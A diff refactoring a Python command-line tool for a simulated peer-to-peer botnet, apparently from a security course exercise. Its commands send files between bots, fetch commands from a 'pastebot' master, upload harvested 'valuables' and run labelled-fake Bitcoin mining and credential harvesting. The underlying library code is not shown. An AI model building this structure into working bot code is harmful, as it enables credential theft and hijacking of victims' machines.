@@ -1,127 +1,115 @@
-
 import socket
 import time
 import threading
 
 from lib.evil import bitcoin_mine, harvest_user_pass
-from lib.p2p import find_bot, bot_server
+from lib.p2p import scan_for_bot, launch_bot_server
 from lib.files import (
-    download_from_pastebot,
-    filestore,
+    filestore, valuables,
+    set_keys_from_secret,
     p2p_upload_file,
-    save_valuable,
     upload_valuables_to_pastebot,
-    valuables,
-    set_keys_from_secret
+    download_from_pastebot,
+    save_valuable
 )
 
 
-def p2p_upload(fn):
-    """
-    Connect to another bot and send a file to them.
-    """
+def p2p_upload(fn):  # Sends a file to another bot securely (Tasks 2 & 3)
     if fn not in filestore:
-        print("That file doesn't exist in the botnet's filestore")
+        print("File not found in local filestore")
         return
-    sconn = find_bot()
+
+    sconn = scan_for_bot()
     if sconn:
         set_keys_from_secret(sconn.shared_secret)
         sconn.send(b"FILE")
         p2p_upload_file(sconn, fn)
 
 
-def p2p_echo():
-    """
-    Test secure echo functionality between bots.
-    """
-    from lib.files import set_keys_from_secret
+def p2p_echo():  # Starts encrypted echo session with another bot (Tasks 2 & 3)
     try:
-        sconn = find_bot()
+        sconn = scan_for_bot()
         if sconn:
-            set_keys_from_secret(sconn.shared_secret) 
+            set_keys_from_secret(sconn.shared_secret)
             sconn.send(b"ECHO")
 
             while True:
-                msg = input("Echo> ")
-                byte_msg = msg.encode("ascii")
-                sconn.send(byte_msg)
+                msg = input("Echo> ").encode("ascii")
+                sconn.send(msg)
+                reply = sconn.recv()
 
-                echo = sconn.recv()
-                assert echo == byte_msg
+                if reply != msg:
+                    print("[warning] Echo mismatch — integrity may be compromised")
+                else:
+                    print("[ok] Echo successful")
 
-                if msg.lower() in ("x", "exit", "quit"):
+                if msg.lower() in (b"x", b"exit", b"quit"):
                     sconn.close()
                     break
     except socket.error:
-        print("Connection closed unexpectedly")
+        print("Connection dropped unexpectedly")
 
 
-if __name__ == "__main__":
-    # Start secure socket server in separate daemon thread
-    thr = threading.Thread(target=bot_server)
-    thr.daemon = True
-    thr.start()
-
-    time.sleep(0.3)  # Let server start before CLI
+if __name__ == "__main__":  # Main interactive loop for bot commands
+    server_thread = threading.Thread(target=launch_bot_server)
+    server_thread.daemon = True
+    server_thread.start()
+    time.sleep(0.3)
 
     while True:
-        raw_cmd = input("Enter command: ")
-        cmd = raw_cmd.strip().split()
+        raw_input = input("Enter command: ")
+        tokens = raw_input.strip().split()
 
-        if not cmd:
-            print("You need to enter a command...")
+        if not tokens:
+            print("Please enter a command.")
             continue
 
-        # Peer-to-peer botnet commands
-        if cmd[0].lower() == "p2p":
-            if len(cmd) > 1:
-                if cmd[1].lower() == "echo":
+        cmd = tokens[0].lower()
+
+        if cmd == "p2p":
+            if len(tokens) > 1:
+                sub = tokens[1].lower()
+                if sub == "echo":
                     p2p_echo()
-                elif cmd[1].lower() == "upload":
-                    if len(cmd) == 3:
-                        p2p_upload(cmd[2])
+                elif sub == "upload":
+                    if len(tokens) == 3:
+                        p2p_upload(tokens[2])
                     else:
-                        print("Format: p2p upload <filename>")
+                        print("Usage: p2p upload <filename>")
                 else:
                     print("Unknown p2p subcommand")
             else:
-                print("The p2p command requires either 'echo' or 'upload'")
-        
-        # Pastebot download (e.g. commands from master)
-        elif cmd[0].lower() == "download":
-            if len(cmd) == 2:
-                download_from_pastebot(cmd[1])
-            else:
-                print("The download command requires a filename")
+                print("Specify either 'echo' or 'upload' after 'p2p'")
 
-        # Upload valuables to master
-        elif cmd[0].lower() == "upload":
-            if len(cmd) == 2:
-                upload_valuables_to_pastebot(cmd[1])
+        elif cmd == "download":  # Downloads file from pastebot
+            if len(tokens) == 2:
+                download_from_pastebot(tokens[1])
             else:
-                print("The upload command requires a filename")
+                print("Usage: download <filename>")
 
-        # Fake Bitcoin mining
-        elif cmd[0].lower() == "mine":
-            print("Mining for Bitcoins...")
+        elif cmd == "upload":  # Uploads valuables to pastebot
+            if len(tokens) == 2:
+                upload_valuables_to_pastebot(tokens[1])
+            else:
+                print("Usage: upload <filename>")
+
+        elif cmd == "mine":  # Simulates Bitcoin mining (Task 4)
+            print("Mining in progress...")
             btc = bitcoin_mine()
-            save_valuable("Bitcoin: %s" % btc)
-            print("Mined and found Bitcoin address:", btc)
+            save_valuable(f"Bitcoin: {btc}")
+            print("Generated fake Bitcoin address:", btc)
 
-        # Fake credential harvesting
-        elif cmd[0].lower() == "harvest":
-            userpass = harvest_user_pass()
-            save_valuable("Username/Password: %s %s" % userpass)
-            print("Found user pass:", userpass)
+        elif cmd == "harvest":  # Simulates credential harvesting (Task 4)
+            creds = harvest_user_pass()
+            save_valuable(f"Username/Password: {creds[0]} {creds[1]}")
+            print("Harvested credentials:", creds)
 
-        # List local files and secrets
-        elif cmd[0].lower() == "list":
-            print("Files stored by this bot:", ", ".join(filestore.keys()))
-            print("Valuables stored by this bot:", valuables)
+        elif cmd == "list":  # Lists local files and harvested data
+            print("Local files:", ", ".join(filestore.keys()))
+            print("Valuables:", valuables)
 
-        # Quit the bot
-        elif cmd[0].lower() in ("exit", "quit"):
+        elif cmd in ("exit", "quit"):  # Exits the bot CLI
             break
 
         else:
-            print("Command not recognised")
+            print("Unknown command")
